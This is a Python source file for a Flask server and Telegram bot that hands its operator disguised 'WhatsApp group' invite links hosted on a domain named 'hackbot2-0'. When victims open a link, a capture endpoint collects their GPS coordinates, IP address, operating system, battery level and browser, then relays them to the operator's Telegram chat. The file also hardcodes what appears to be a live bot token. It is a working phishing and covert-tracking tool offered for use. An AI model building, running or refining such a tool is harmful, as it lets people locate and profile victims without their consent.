import os
import threading
import requests
from flask import Flask, render_template, request, jsonify
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
TOKEN = os.getenv('BOT_TOKEN', '8619342353:AAHJRIZvlj1weBM6jkLUWAHDeo6eNoBcR18')
BASE_URL = os.getenv('BASE_URL', 'https://hackbot2-0.onrender.com') 

app = Flask(__name__)

@app.route('/join')
def join():
    group_name = request.args.get('group', 'WhatsApp Group')
    chat_id = request.args.get('id')
    return render_template('index.html', group_name=group_name, chat_id=chat_id)

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    chat_id = data.get('chat_id')
    
   
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    lat = data.get('lat')
    lon = data.get('lon')
    
    if lat != "Denied" and lon != "Denied":
        location_link = f"https://www.google.com/maps?q={lat},{lon}"
    else:
        location_link = "permission dennied"

    report = (
        f"🎯 result 🎯\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📱 **OS:** `{data.get('platform')}`\n"
        f"🔋 **Battery:** `{data.get('battery')}`\n"
        f"📡 **IP Address:** `{user_ip}`\n"
        f"🌐 **Browser:** `{data.get('browser')[:50]}...`\n"
        f"📍 **Location:** clickhere]({location_link})\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )
    
    send_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    requests.post(send_url, data={'chat_id': chat_id, 'text': report, 'parse_mode': 'Markdown'})
    
    return jsonify({"status": "success"})

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)



async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👋\nWhatsApp groupname adikk")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    group_name = update.message.text
    chat_id = update.message.chat_id
    
    safe_group_name = group_name.replace(' ', '%20')
    invite_link = f"{BASE_URL}/join?group={safe_group_name}&id={chat_id}"
    
    await update.message.reply_text(f"✅ link ready\n\n{invite_link}")

def run_bot():
    application = ApplicationBuilder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))
    application.run_polling()


if __name__ == '__main__':
    t = threading.Thread(target=run_flask)
    t.daemon = True
    t.start()
    
    print("bot is ready")
    run_bot()

